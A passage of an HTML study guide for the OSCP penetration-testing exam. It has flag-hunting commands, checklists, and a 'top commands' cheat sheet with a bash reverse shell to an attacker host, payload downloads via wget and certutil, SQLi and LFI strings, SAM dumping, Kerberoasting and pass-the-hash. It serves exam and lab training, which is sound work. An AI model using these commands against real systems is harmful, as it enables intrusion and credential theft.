+<h2 id="v8--banned-avoid-using-these-can-void-points-[exam-rules-2026]">⛔ BANNED / avoid (using these can void points — <code class="tag">[EXAM-RULES-2026]</code>)<a class="anchor" href="#v8--banned-avoid-using-these-can-void-points-[exam-rules-2026]">#</a></h2>
+<pre><code>⛔ sqlmap, sqlninja, db_autopwn, browser_autopwn   (automatic exploitation)
+⛔ Nessus, OpenVAS, Nexpose                         (mass/auto vuln scanners)
+⛔ Responder/Inveigh POISONING, bettercap, ARP/DNS spoofing   (spoofing)
+⛔ Burp Pro, Metasploit Pro, other commercial tools
+⛔ AI / LLM chatbots during the exam AND report   (this KB as STATIC notes = allowed)
+1️⃣ Metasploit modules/Meterpreter beyond your ONE chosen target</code></pre>
+<p><strong>Reality check:</strong> you&#x27;ll pass using maybe 15 of these constantly — nmap, feroxbuster/ffuf, netexec, smbclient, impacket, evil-winrm, BloodHound, linpeas/winpeas, the potatoes, hashcat, ligolo/chisel, nc/socat, searchsploit, msfvenom. Learn those cold; the rest are situational.</p>
+<hr>
+<h1 id="v8-[flag-hunt]-find-the-flag-on-any-box-paste-and-go">[FLAG-HUNT]  🚩 find the flag on any box (paste-and-go)<a class="anchor" href="#v8-[flag-hunt]-find-the-flag-on-any-box-paste-and-go">#</a></h1>
+<blockquote>Flags are usually named <code>proof.txt</code> / <code>local.txt</code> (also <code>flag.txt</code>/<code>root.txt</code>/<code>user.txt</code>) and live on a <strong>user&#x27;s Desktop</strong> (Windows) or **<code>/root</code><strong> / </strong><code>/home/&lt;user&gt;</code><strong> (Linux). If they&#x27;re not there, search by </strong>name<strong> then by </strong>content**.</blockquote>
+<h2 id="v8--windows-powershell-in-evil-winrm-ps-shell">🪟 Windows — PowerShell (in evil-winrm / PS shell)<a class="anchor" href="#v8--windows-powershell-in-evil-winrm-ps-shell">#</a></h2>
+<pre><code>whoami                                                         # who am I? (flag is often on THIS user&#x27;s Desktop)
+dir C:\Users\ ; dir C:\Users\*\Desktop\                        # list users + their desktops
+type C:\Users\*\Desktop\*.txt                                  # dump every desktop .txt
+# search by FILENAME anywhere:
+Get-ChildItem C:\ -Recurse -Force -Include proof.txt,local.txt,flag.txt,root.txt,user.txt -EA SilentlyContinue | Select FullName
+# search by CONTENT (flag marker):
+Get-ChildItem C:\Users\ -Recurse -Include *.txt -EA SilentlyContinue | Select-String -Pattern &#x27;OS\{|flag&#x27; -List</code></pre>
+<h2 id="v8--windows-cmd">🪟 Windows — cmd<a class="anchor" href="#v8--windows-cmd">#</a></h2>
+<pre><code>dir /s /b C:\proof.txt C:\*flag*.txt 2&gt;nul                     # find by name
+where /r C:\ proof.txt                                          # locate proof.txt
+type C:\Users\Administrator\Desktop\proof.txt                   # common spot
+findstr /s /i &quot;OS{ flag&quot; C:\Users\*.txt 2&gt;nul                   # find by content</code></pre>
+<h2 id="v8--linux-on-a-target-shell">🐧 Linux (on a target shell)<a class="anchor" href="#v8--linux-on-a-target-shell">#</a></h2>
+<pre><code>id                                                             # who am I?
+ls -la /root/ /home/*/ 2&gt;/dev/null                             # the two usual spots
+cat /root/*.txt /home/*/*.txt 2&gt;/dev/null                      # dump them
+# by FILENAME anywhere:
+find / \( -iname &#x27;proof.txt&#x27; -o -iname &#x27;local.txt&#x27; -o -iname &#x27;flag*.txt&#x27; -o -iname &#x27;root.txt&#x27; -o -iname &#x27;user.txt&#x27; \) -not -path &#x27;/proc/*&#x27; 2&gt;/dev/null
+# by CONTENT (flag marker), excluding noise dirs:
+grep -rliE &#x27;flag\{|OS\{&#x27; --exclude-dir={proc,sys,run,dev,.cache} /root /home /var /opt /tmp /etc 2&gt;/dev/null</code></pre>
+<p><strong>If nothing:</strong> you may not have the right privileges yet (a root-only flag needs privesc first), or you&#x27;re on the wrong host — <code>whoami</code>/<code>id</code>, then check the *other* users&#x27; homes/desktops (as admin/root you can read them all).</p>
+<h1 id="v8-[machine-journal]-reusable-worksheet-copy-per-target">[MACHINE-JOURNAL] reusable worksheet (copy per target)<a class="anchor" href="#v8-[machine-journal]-reusable-worksheet-copy-per-target">#</a></h1>
+<pre><code>TARGET: __________  IP: __________  HOSTNAME: __________  OS: __________
+DATE: ____  START: ____  (AD set? Y/N)  PROVIDED CREDS: __________
+
+OPEN PORTS (from all-tcp + scv):
+ PORT  SERVICE  VERSION  ENUM DONE?  FINDINGS
+ ____  _______  _______  ________    ________________
+
+WEB:  URLs ____  VHOSTS ____  DIRS ____  PARAMS ____  TECH/VERSION ____  LOGIN/UPLOAD? ____
+
+CREDENTIALS (source → user:pass/hash → tried where → works?):
+ - ______________________________________________
+
+INITIAL ACCESS HYPOTHESES (claim / test / timebox):
+ H1: ______  test: ______  result: ______  next: ______
+ H2: ______  test: ______  result: ______  next: ______
+
+FOOTHOLD: user ____ via ____ (screenshot: local.txt + id/whoami + ip ✔)
+
+LOCAL ENUM: sudo -l / whoami-priv ____  SUID/services ____  creds looted ____  internal subnets ____
+
+PRIVESC: vector ____  → root/SYSTEM (screenshot: proof.txt + whoami + ip ✔)
+
+LATERAL / PIVOT: creds reused on ____  tunnel ____  new hosts ____
+
+AD: BloodHound path ____  roasts ____  ACL edges ____  DCSync ✔?
+
+PROOF CAPTURED: [ ] local.txt  [ ] proof.txt  [ ] AD each host  [ ] flags entered in panel
+
+WHAT I MISSED (post-mortem): ____________________
+LESSON LEARNED: ____________________</code></pre>
+<hr>
+<h1 id="v8-final-deliverables">FINAL DELIVERABLES<a class="anchor" href="#v8-final-deliverables">#</a></h1>
+<h2 id="v8-a-[master-index]-see-volume-0-full-tag-list-volume-map">A. [MASTER-INDEX] → see Volume 0 (full tag list + volume map).<a class="anchor" href="#v8-a-[master-index]-see-volume-0-full-tag-list-volume-map">#</a></h2>
+<h2 id="v8-b-[top-100-things]-condensed-to-the-highest-value-50-principles-expand-via-tags">B. [TOP-100-THINGS] (condensed to the highest-value ~50 principles; expand via tags)<a class="anchor" href="#v8-b-[top-100-things]-condensed-to-the-highest-value-50-principles-expand-via-tags">#</a></h2>
+<p>1 Enumerate all ports+web before exploiting. 2 AD = 40 pts, do it first/most. 3 No bonus points — need clean 70. 4 Metasploit one target only. 5 Spray every cred everywhere. 6 Cheapest test first. 7 Screenshot proof immediately (flag+id+ip). 8 Notes continuously, one file/target. 9 Re-enumerate after every privilege change. 10 Read tool output literally. 11 <code>-p-</code> always. 12 Quick UDP top-100. 13 Manual &gt; MSF for muscle memory. 14 Password reuse beats exploits. 15 Stabilize shells before working. 16 Kerberoast + AS-REP every AD. 17 BloodHound early, mark Owned. 18 Verify scanners manually (false positives). 19 One box&#x27;s loot unlocks others. 20 Rotate targets to break tunnel vision. 21 Understand exploits before running. 22 Save all artifacts. 23 <code>sudo -l</code>/<code>whoami /priv</code> first on any shell. 24 Loot configs/history/backups/git/DB. 25 Reverts are free. 26 Report is graded — repro steps required. 27 No one-click AD auto-pwn on exam. 28 Eat/sleep/break. 29 Fix Kerberos clock skew. 30 LFI value is often file-read not RCE. 31 SUID/sudo → GTFOBins. 32 SeImpersonate → Potato → SYSTEM. 33 Unquoted path needs a writable segment. 34 NTLM hash → PtH before cracking. 35 MSSQL → xp_cmdshell; Postgres → COPY PROGRAM; MySQL → FILE. 36 Add hostnames to /etc/hosts. 37 vhost fuzz with <code>-fs</code> baseline. 38 SNMP/UDP hides creds in process args. 39 SMB null/guest → shares/users. 40 WriteDACL/WriteOwner/GenericAll → own the object. 41 DCSync = game over. 42 Ligolo &gt; proxychains where possible; <code>-sT</code> over SOCKS. 43 15-min re-read / 30-min switch. 44 If it needs a 0-day, you missed enum. 45 Timebox every hypothesis. 46 Try anonymous/default first. 47 Common egress ports 443/80/8080 for shells. 48 LHOST = tun0, not eth0. 49 Kernel exploits last. 50 Enter flags in the panel AND show in report.</p>
+<h2 id="v8-c-[top-100-commands]-the-ones-you-actually-type">C. [TOP-100-COMMANDS] (the ones you actually type)<a class="anchor" href="#v8-c-[top-100-commands]-the-ones-you-actually-type">#</a></h2>
+<pre><code># ENUM
+nmap -p- --min-rate 2000 -Pn -oN all.txt $IP
+nmap -p&lt;ports&gt; -sCV -Pn -oN scv.txt $IP
+nmap -sU --top-ports 100 -Pn $IP
+whatweb http://$IP ; curl -sI http://$IP
+feroxbuster -u http://$IP -x php,txt,html
+ffuf -u http://$IP/FUZZ -w dirlist.txt
+ffuf -u http://$IP -H &quot;Host: FUZZ.$D&quot; -w subs.txt -fs N
+nxc smb $IP ; nxc smb $IP -u &#x27;&#x27; -p &#x27;&#x27; --shares
+enum4linux-ng -A $IP ; smbclient -N -L //$IP/
+snmpwalk -v2c -c public $IP ; snmp-check $IP
+dig axfr @$IP $D ; showmount -e $IP
+ldapsearch -x -H ldap://$IP -b &quot;dc=..,dc=..&quot;
+rpcclient -U &#x27;&#x27; -N $IP   (enumdomusers)
+# WEB/SQLI
+sqlmap -r req.txt --batch --dbs
+&#x27; UNION SELECT 1,2,3-- -   ;   &#x27; OR 1=1-- -
+?page=../../../../etc/passwd ; php://filter/convert.base64-encode/resource=index.php
+# SHELLS/TRANSFER
+nc -lvnp 443
+bash -i &gt;&amp; /dev/tcp/$LHOST/443 0&gt;&amp;1
+python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27; ; stty raw -echo; fg
+python3 -m http.server 80 ; impacket-smbserver share . -smb2support
+wget http://$LHOST/f -O /tmp/f ; certutil -urlcache -split -f http://$LHOST/f f
+# LINUX PRIVESC
+id; sudo -l; find / -perm -4000 2&gt;/dev/null; getcap -r / 2&gt;/dev/null
+cat /etc/crontab; ./linpeas.sh
+# WINDOWS PRIVESC
+whoami /all; whoami /priv; systeminfo; cmdkey /list
+.\winPEASx64.exe ; PrintSpoofer64.exe -i -c cmd
+reg save HKLM\SAM sam &amp; reg save HKLM\SYSTEM sys
+# CREDS/HASH
+secretsdump.py $D/$U:$P@$IP ; nxc smb $IP -u $U -H $H
+hashcat -m 1000 h rockyou.txt ; hashcat -m 13100 tgs rockyou.txt -r best64.rule
+# AD
+bloodhound-python -u $U -p $P -d $D -ns $DC -c all --zip
+impacket-GetUserSPNs -request $D/$U:$P -dc-ip $DC
+impacket-GetNPUsers $D/ -no-pass -usersfile users -dc-ip $DC
+nxc smb &lt;subnet&gt; -u $U -p $P --continue-on-success
+evil-winrm -i $IP -u $U -p $P ; impacket-psexec $D/$U:$P@$IP
+net rpc password target newpass -U &quot;$D/$U%$P&quot; -S $DC
+# PIVOT
+./proxy -selfcert ; ./agent -connect $LHOST:11601 -ignore-cert
+ssh -D 1080 user@pivot ; proxychains nxc smb 172.16.5.0/24
+./chisel server -p 8000 --reverse ; ./chisel client $LHOST:8000 R:socks</code></pre>
+<h2 id="v8-d-[top-50-enum-checks]">D. [TOP-50-ENUM-CHECKS]<a class="anchor" href="#v8-d-[top-50-enum-checks]">#</a></h2>
+<p>Full <code>-p-</code> TCP; <code>-sCV</code> on open; top-100 UDP; every web port fully; whatweb+headers+source+robots+JS; dir brute (recursive)+extensions; vhost fuzz; param discovery; SMB null/guest shares+users+rid-brute; enum4linux-ng; read every readable share; SNMP <code>public</code> walk; DNS zone transfer + SRV; LDAP anon bind + descriptions; rpcclient users; NFS showmount+mount; FTP anon+upload; SMTP user enum; MSSQL/MySQL/Postgres default creds; Redis/Mongo unauth; searchsploit every version; check <code>/.git</code>,<code>.env</code>,backups; TLS cert SAN for vhosts; add hostnames to <code>/etc/hosts</code>; re-scan after new access; identify OS via TTL/nmap; note internal subnets; check default creds on every login; look for upload/exec features; test one injection char per param; capture Responder if on-subnet; check WinRM/RDP reachability with creds; kerberoast+asrep every AD; BloodHound collect; password policy before spray; spray each cred all services; check process lists (pspy/ps); check <code>sudo -l</code>/<code>whoami /priv</code>; look for creds in configs/history; check cron/scheduled tasks; enumerate installed software versions; check writable dirs/files; check capabilities; verify each scanner finding manually.</p>
+<h2 id="v8-e-[top-50-linux-privesc-checks]">E. [TOP-50-LINUX-PRIVESC-CHECKS]<a class="anchor" href="#v8-e-[top-50-linux-privesc-checks]">#</a></h2>
+<p><code>id</code>; <code>sudo -l</code>; SUID <code>find -perm -4000</code>; SGID <code>-2000</code>; capabilities <code>getcap -r /</code>; <code>/etc/crontab</code>+cron.d/daily; pspy for hidden crons; writable scripts run by root; wildcard-injection dirs; PATH-hijackable SUID (strings/ltrace); systemd writable units/timers; writable <code>/etc/passwd</code>/<code>shadow</code>/<code>sudoers(.d)</code>; NFS <code>no_root_squash</code>; docker/lxd group; docker socket; container caps/mounts; <code>~/.ssh</code> keys (reuse); <code>~/.bash_history</code>+<code>.*_history</code>; config creds (<code>/var/www</code>,<code>.env</code>,DB); <code>.kdbx</code>/keepass; backups; mounted fstab creds; root processes (<code>ps aux</code>); LD_PRELOAD/LD_LIBRARY in sudo env_keep; sudo version CVEs (3156/14287); pkexec PwnKit; kernel <code>uname</code>+les2 (last); MySQL blank root; internal services (<code>ss -tlnp</code>); cron on <code>/etc/cron.d</code>; setuid perl/python caps; writable <code>/opt</code>/<code>/usr/local/bin</code>; group memberships (<code>id</code>); readable <code>/root</code> via cap_dac; SUID nmap/vim/find (GTFOBins); <code>authorized_keys</code> writable; <code>.netrc</code>/git creds; snmp on localhost; env creds; tmp race scripts; message-of-the-day writable; log-writable for injection; python library hijack; sudo edit of tar/zip; abusing <code>screen</code>/<code>tmux</code> sockets; check <code>getcap</code> on python.</p>
+<h2 id="v8-f-[top-50-windows-privesc-checks]">F. [TOP-50-WINDOWS-PRIVESC-CHECKS]<a class="anchor" href="#v8-f-[top-50-windows-privesc-checks]">#</a></h2>
+<p><code>whoami /all</code>+<code>/priv</code>; SeImpersonate→Potato; SeAssignPrimaryToken→Potato; SeBackup/Restore→SAM/NTDS; SeTakeOwnership; SeDebug→LSASS; SeLoadDriver; unquoted service paths (writable segment); weak service binary perms; service DACL <code>sc config</code>; DLL hijack/search order; AlwaysInstallElevated (HKLM+HKCU); writable Run/autorun keys; autologon <code>Winlogon</code> DefaultPassword; <code>cmdkey /list</code>+runas savecred; saved creds/DPAPI; PowerShell history file; unattend/sysprep xml; GPP cpassword; <code>web.config</code>/connection strings; KeePass; browser creds; scheduled tasks weak binary; startup folder writable; writable PATH dir before system32; installed vuln software (<code>wmic product</code>); app-pool identity (SeImpersonate); token impersonation (incognito); UAC bypass (if medium-IL admin); named-pipe impersonation; <code>runas /netonly</code>; hardcoded creds in scripts/registry; <code>reg query</code> for passwords; accessible SAM/SYSTEM backups; writable service registry key; <code>wsl</code>/docker on Windows; MSSQL service acct→SYSTEM; weak folder perms in <code>C:\</code>; <code>Program Files</code> writable; missing patches (<code>systeminfo</code>→wesng, last); credential manager vault; Wi-Fi profiles; <code>net user</code>/local admins; scheduled task run-as; COM hijack; printnightmare (context); check <code>whoami /groups</code> integrity level.</p>
+<h2 id="v8-g-[top-50-ad-checks]">G. [TOP-50-AD-CHECKS]<a class="anchor" href="#v8-g-[top-50-ad-checks]">#</a></h2>
+<p>Fix clock skew; <code>nxc smb $DC</code> domain/host; validate provided cred; BloodHound <code>-c all</code> early; mark Owned nodes; Kerberoast <code>GetUserSPNs -request</code>; AS-REP <code>GetNPUsers</code>; crack roasts (13100/18200); spray each cred all hosts (<code>--continue-on-success</code>); password policy/lockout first; RID brute users; LDAP anon bind + <code>description</code>; <code>ldapdomaindump</code>; read SYSVOL/NETLOGON scripts; GPP cpassword; find SPNs; delegation flags (unconstrained/constrained/RBCD); ACL edges (GenericAll/Write/DACL/Owner/AddMember/AddKeyCredentialLink); ForceChangePassword; shadow credentials (certipy/pywhisker); targeted Kerberoast; DCSync rights; <code>secretsdump</code> a host you own (SAM/LSA); LSASS on owned host; reuse local admin hash across hosts (PtH); find where cred is local admin (Pwn3d!); psexec/wmiexec/evil-winrm/rdp; ADCS vuln templates (certipy find, ESC1/8); LAPS readable; gMSA readable; trust relationships; <code>ExtraSids</code>/SID history; Golden/Silver ticket (post-krbtgt); Pass-the-Ticket (getTGT/KRB5CCNAME); <code>-k</code> FQDN issues; MSSQL links to other hosts; coerce auth (printerbug) to relay/unconstrained; check <code>ms-DS-MachineAccountQuota</code> (add computer for RBCD); readable <code>description</code>/notes for creds; group memberships up to DA; find DA-session hosts; DNS SRV for DCs; SMB signing off host for relay; kerberoast without pre-auth (AS-REP as entry); re-run BloodHound &quot;from owned&quot; after each new principal.</p>
+<h2 id="v8-h-[top-50-troubleshooting-checks]">H. [TOP-50-TROUBLESHOOTING-CHECKS]<a class="anchor" href="#v8-h-[top-50-troubleshooting-checks]">#</a></h2>
+<p>LHOST=tun0; listener up; egress port (443/80/8080); URL-encode web payloads; base64 commands; try sh/python/nc; AV on PS (<code>-ep bypass</code>/nc.exe); tcpdump to see SYN; <code>curl -v</code> replicate browser; add <code>Host:</code>/cookie/UA; <code>-L -k</code>; py2 vs py3; match exploit version/arch; install deps; change hardcoded IP; SMB <code>-d DOMAIN</code>/<code>--local-auth</code>; SMBv1 <code>NT1</code>; PtH <code>-H</code>; Kerberos skew <code>ntpdate</code>; FQDN+<code>/etc/hosts</code> for SPN; WinRM rights vs SMB; TLS 5986 <code>-S</code>; TTY full upgrade; <code>stty rows/cols</code>; certutil→curl.exe/bitsadmin/SMB; binary transfer mode; hashcat mode/format; strip username; rules+bigger list; chisel port/arch/<code>--reverse</code>; proxychains <code>socks5 127.0.0.1 1080</code>+<code>-sT</code>; ligolo route+session; DNS→/etc/hosts; vhost <code>-fs</code> baseline; nmap <code>-Pn</code>+lower rate; kernel exploit build match; revert crashed box; re-enumerate when stuck; verify tunnel with a known-open port; check password expired/reset; check lockout before spray; confirm you&#x27;re on the right subnet; confirm proof screenshot has all 3 elements.</p>
+<h2 id="v8-i-[top-50-found-scenarios]-all-covered-above-under-[found-]">I. [TOP-50-FOUND-SCENARIOS] → all covered above under <code>[FOUND-*]</code><a class="anchor" href="#v8-i-[top-50-found-scenarios]-all-covered-above-under-[found-]">#</a></h2>
+<p>creds, ssh key, SUID, sudo, SMB, writable service, pw in config, git, backup, SQLi, LFI, RFI, cmd injection, SSRF, SSTI, XXE, upload, deserialize, IDOR, JWT, domain user, SPN, AS-REP user, hash, NTLM hash, Linux shell, Windows shell, WinRM, RDP, LDAP anon, SNMP public, NFS export, MSSQL creds, MySQL/Postgres/Redis/Mongo, Kerberos port 88, BloodHound GenericAll/WriteDACL/WriteOwner/AddKeyCredentialLink/DCSync, delegation, pivot host, dual-homed subnet, cracked service account, readable share, unattend.xml, GPP cpassword, phpinfo, exposed .env, default creds page.</p>
+<h2 id="v8-j-[final-day-quick-reference]-print-this">J. [FINAL-DAY-QUICK-REFERENCE]  (print this)<a class="anchor" href="#v8-j-[final-day-quick-reference]-print-this">#</a></h2>
+<pre><code>SET UP: folder per target (scans/loot/exploits/www/notes.md). VPN up. LHOST=tun0. Screenshot tool ready. Note template open.
+KICK OFF: nmap -p- --min-rate 2000 -Pn on ALL targets in parallel. Read briefs.
+PRIORITY: AD set FIRST (fresh brain). Standalones after. Rotate on 30-min rule.
+EACH TARGET: -sCV open ports → per-service enum → creds → foothold → stabilize → local enum → privesc → PROOF SCREENSHOT NOW.
+EVERY CRED: spray all services/hosts/users + variations.
+AD: skew fix → BloodHound → Kerberoast+AS-REP → spray → ACL path → DCSync → PtH DC.
+STUCK 30 min: [STUCK-PROTOCOL] → re-enum → switch target.
+PROOF = flag + whoami/id + ip/ipconfig in ONE shot. Enter flag in panel.
+LAST 3 HRS: stop hacking, verify all proofs + screenshots + notes complete.
+METASPLOIT: one target only. Manual everything else.
+BREAKS: eat, hydrate, sleep 4-6h. Fatigue = tunnel vision.</code></pre>
+<h2 id="v8-k-[minimum-viable-prep-plan]-volume-0-part-31-study-deep-ad-enum-privesc-web-core-pivoting-practice-4060-boxes-ad-weighted-skim-bofexotic">K. [MINIMUM-VIABLE-PREP-PLAN] → Volume 0 Part 31 (study deep: AD, enum, privesc, web core, pivoting; practice ~40–60 boxes AD-weighted; skim BOF/exotic).<a class="anchor" href="#v8-k-[minimum-viable-prep-plan]-volume-0-part-31-study-deep-ad-enum-privesc-web-core-pivoting-practice-4060-boxes-ad-weighted-skim-bofexotic">#</a></h2>
+<h2 id="v8-l-[7-day-plan]-volume-0-part-32">L. [7-DAY-PLAN] → Volume 0 Part 32.<a class="anchor" href="#v8-l-[7-day-plan]-volume-0-part-32">#</a></h2>
+<h2 id="v8-m-[current-offsec-rules]-volume-0-23h45m24h-10070-40-ad-320-no-bonus-msf-one-target-proof-flagwhoamiip-report-required-oscp-3-yr">M. [CURRENT-OFFSEC-RULES] → Volume 0 (23h45m+24h, 100/70, 40 AD + 3×20, no bonus, MSF one target, proof = flag+whoami+ip, report required, OSCP+ 3-yr).<a class="anchor" href="#v8-m-[current-offsec-rules]-volume-0-23h45m24h-10070-40-ad-320-no-bonus-msf-one-target-proof-flagwhoamiip-report-required-oscp-3-yr">#</a></h2>
+<h2 id="v8-[resources]-external-tools-references-bookmark-and-cache-offline">[RESOURCES]  🔗 external tools &amp; references (bookmark — and cache OFFLINE)<a class="anchor" href="#v8-[resources]-external-tools-references-bookmark-and-cache-offline">#</a></h2>
+<blockquote>On the OSCP exam you <strong>may</strong> use public internet references (docs, GTFOBins, public exploits) — you may <strong>not</strong> use AI chatbots (<code class="tag">[EXAM-RULES-2026]</code>). Still, <strong>save offline copies</strong> of the starred ★ ones in case of connectivity issues on the day.</blockquote>
+<h3 id="v8-exploit-cve-research">Exploit / CVE research<a class="anchor" href="#v8-exploit-cve-research">#</a></h3>
+<ul>
+<li><a href="https://www.exploit-db.com/" target="_blank" rel="noopener">Exploit-DB (EDB)</a> — OffSec&#x27;s public exploit archive; mirrored locally by <code>searchsploit</code>.</li>
+<li><a href="https://www.exploit-db.com/google-hacking-database" target="_blank" rel="noopener">Google Hacking DB (GHDB)</a> — dork reference.</li>
+<li><a href="https://nvd.nist.gov/" target="_blank" rel="noopener">NVD (NIST CVE database)</a> · <a href="https://www.cvedetails.com/" target="_blank" rel="noopener">CVEDetails</a> — look up a version&#x27;s CVEs.</li>
+<li><a href="https://packetstormsecurity.com/" target="_blank" rel="noopener">PacketStorm</a> — additional exploit archive.</li>
+</ul>
+<h3 id="v8-privilege-escalation-binary-abuse">Privilege escalation / binary abuse ★<a class="anchor" href="#v8-privilege-escalation-binary-abuse">#</a></h3>
+<ul>
+<li>★ <a href="https://gtfobins.github.io/" target="_blank" rel="noopener">GTFOBins</a> — Linux SUID/sudo/capability escapes (the KB defers here 25×).</li>
+<li>★ <a href="https://lolbas-project.github.io/" target="_blank" rel="noopener">LOLBAS</a> — Windows living-off-the-land binaries.</li>
+<li><a href="https://wadcoms.github.io/" target="_blank" rel="noopener">WADComs</a> — Windows/AD offensive command lookup.</li>
+</ul>
+<h3 id="v8-visual-mind-maps-attack-path-flowcharts-glance-to-find-your-next-move">Visual mind maps (attack-path flowcharts — glance to find your next move)<a class="anchor" href="#v8-visual-mind-maps-attack-path-flowcharts-glance-to-find-your-next-move">#</a></h3>
+<ul>
+<li>★ <a href="https://orange-cyberdefense.github.io/ocd-mindmaps/" target="_blank" rel="noopener">Orange Cyberdefense mind maps</a> — the famous <strong>Active Directory</strong> attack mind map (and pentest/web ones). Print/cache it — a visual companion to <code class="tag">[AD-ATTACK-PATH]</code>.</li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources" target="_blank" rel="noopener">PayloadsAllTheThings AD README</a> — text methodology maps.</li>
+</ul>
+<h3 id="v8-web-general-technique">Web / general technique ★<a class="anchor" href="#v8-web-general-technique">#</a></h3>
+<ul>
+<li>★ <a href="https://book.hacktricks.xyz/" target="_blank" rel="noopener">HackTricks</a> — the big per-service/technique reference.</li>
+<li>★ <a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" rel="noopener">PayloadsAllTheThings</a> — payloads for every web vuln.</li>
+<li><a href="https://owasp.org/www-project-web-security-testing-guide/" target="_blank" rel="noopener">OWASP Web Security Testing Guide</a> — methodology.</li>
+</ul>
+<h3 id="v8-shells-hashes-wordlists">Shells / hashes / wordlists ★<a class="anchor" href="#v8-shells-hashes-wordlists">#</a></h3>
+<ul>
+<li>★ <a href="https://www.revshells.com/" target="_blank" rel="noopener">revshells.com</a> — reverse-shell generator (fill IP+port).</li>
+<li><a href="https://hashcat.net/wiki/doku.php?id=example_hashes" target="_blank" rel="noopener">hashcat example hashes</a> — identify the right <code>-m</code> mode. · <a href="https://hashcat.net/hashcat/" target="_blank" rel="noopener">hashcat</a></li>
+<li><a href="https://github.com/danielmiessler/SecLists" target="_blank" rel="noopener">SecLists</a> — wordlists (ships with Kali under <code>/usr/share/seclists</code>).</li>
+</ul>
+<h3 id="v8-core-tool-repos-download-binaries-from-releases">Core tool repos (download binaries from &quot;Releases&quot;)<a class="anchor" href="#v8-core-tool-repos-download-binaries-from-releases">#</a></h3>
+<ul>
+<li><a href="https://github.com/peass-ng/PEASS-ng" target="_blank" rel="noopener">PEASS-ng (linpeas/winpeas)</a> · <a href="https://github.com/DominicBreuker/pspy" target="_blank" rel="noopener">pspy</a></li>
+<li><a href="https://github.com/fortra/impacket" target="_blank" rel="noopener">Impacket</a> · <a href="https://github.com/Pennyw0rth/NetExec" target="_blank" rel="noopener">NetExec</a> · <a href="https://github.com/SpecterOps/BloodHound" target="_blank" rel="noopener">BloodHound</a> · <a href="https://github.com/dirkjanm/BloodHound.py" target="_blank" rel="noopener">BloodHound.py</a></li>
+<li><a href="https://github.com/nicocha30/ligolo-ng" target="_blank" rel="noopener">Ligolo-ng</a> · <a href="https://github.com/jpillora/chisel" target="_blank" rel="noopener">chisel</a></li>
+<li><a href="https://github.com/itm4n/PrintSpoofer" target="_blank" rel="noopener">PrintSpoofer</a> · <a href="https://github.com/BeichenDream/GodPotato" target="_blank" rel="noopener">GodPotato</a> · <a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">mimikatz</a></li>
+<li><a href="https://github.com/GhostPack/Rubeus" target="_blank" rel="noopener">Rubeus</a> · <a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener">PowerSploit (PowerView/PowerUp)</a> · <a href="https://github.com/ly4k/Certipy" target="_blank" rel="noopener">Certipy</a></li>
+</ul>
+<h3 id="v8-exam-safe-enumeration-automation-allowed-no-auto-exploitation">Exam-safe enumeration automation (allowed — no auto-exploitation)<a class="anchor" href="#v8-exam-safe-enumeration-automation-allowed-no-auto-exploitation">#</a></h3>
+<ul>
+<li><a href="https://github.com/Tib3rius/AutoRecon" target="_blank" rel="noopener">AutoRecon</a> — multi-threaded auto-enum; built to comply with OSCP rules.</li>
+<li><a href="https://github.com/21y4d/nmapAutomator" target="_blank" rel="noopener">nmapAutomator</a> — staged nmap + service enum wrapper.</li>
+<li>See <code class="tag">[EXAM-SCRIPTS]</code> for your own copy-paste helper (<code>oscp.sh</code>).</li>
+</ul>
+<h3 id="v8-practice-do-boxes-here">Practice (do boxes here)<a class="anchor" href="#v8-practice-do-boxes-here">#</a></h3>
+<ul>
+<li><a href="https://www.offsec.com/labs/" target="_blank" rel="noopener">OffSec Proving Grounds</a> — closest to exam (&quot;PG Practice&quot;).</li>
+<li><a href="https://www.hackthebox.com/" target="_blank" rel="noopener">Hack The Box</a> — use <strong>TJ_Null&#x27;s OSCP-like list</strong> (search &quot;TJ Null OSCP-like NetSecFocus&quot;) + IppSec videos.</li>
+<li><a href="https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide" target="_blank" rel="noopener">OffSec exam guide</a> — <strong>re-read before your sitting</strong> (rules can change).</li>
+</ul>
+<h3 id="v8-[resources-more]-every-other-named-tool-so-nothing-is-unlinked">[RESOURCES-MORE]  every other named tool (so nothing is unlinked)<a class="anchor" href="#v8-[resources-more]-every-other-named-tool-so-nothing-is-unlinked">#</a></h3>
+<p><strong>Windows privesc — potatoes &amp; enum:</strong></p>
+<p><a href="https://github.com/antonioCoco/RunasCs" target="_blank" rel="noopener">RunasCs</a> · <a href="https://github.com/antonioCoco/RoguePotato" target="_blank" rel="noopener">RoguePotato</a> · <a href="https://github.com/antonioCoco/JuicyPotatoNG" target="_blank" rel="noopener">JuicyPotatoNG</a> · <a href="https://github.com/CCob/SweetPotato" target="_blank" rel="noopener">SweetPotato</a> · <a href="https://github.com/bugch3ck/SharpEfsPotato" target="_blank" rel="noopener">SharpEfsPotato</a> · <a href="https://github.com/tylerdotrar/SigmaPotato" target="_blank" rel="noopener">SigmaPotato</a> · <a href="https://github.com/itm4n/FullPowers" target="_blank" rel="noopener">FullPowers</a> · <a href="https://github.com/itm4n/PrivescCheck" target="_blank" rel="noopener">PrivescCheck</a> · <a href="https://github.com/GhostPack/Seatbelt" target="_blank" rel="noopener">Seatbelt</a> · <a href="https://github.com/411Hall/JAWS" target="_blank" rel="noopener">JAWS</a> · <a href="https://github.com/rasta-mouse/Watson" target="_blank" rel="noopener">Watson</a> · <a href="https://github.com/bitsadmin/wesng" target="_blank" rel="noopener">wesng</a> · <a href="https://github.com/hfiref0x/UACME" target="_blank" rel="noopener">UACME</a></p>
+<p><strong>Linux privesc enum:</strong></p>
+<p><a href="https://github.com/rebootuser/LinEnum" target="_blank" rel="noopener">LinEnum</a> · <a href="https://github.com/The-Z-Labs/linux-exploit-suggester" target="_blank" rel="noopener">linux-exploit-suggester</a> · <a href="https://github.com/sleventyeleven/linuxprivchecker" target="_blank" rel="noopener">linuxprivchecker</a></p>
+<p><strong>Shells / transfer:</strong></p>
+<p><a href="https://github.com/besimorhino/powercat" target="_blank" rel="noopener">Powercat</a> · <a href="https://github.com/antonioCoco/ConPtyShell" target="_blank" rel="noopener">ConPtyShell</a> · <a href="https://github.com/Hackplayers/evil-winrm" target="_blank" rel="noopener">evil-winrm</a></p>
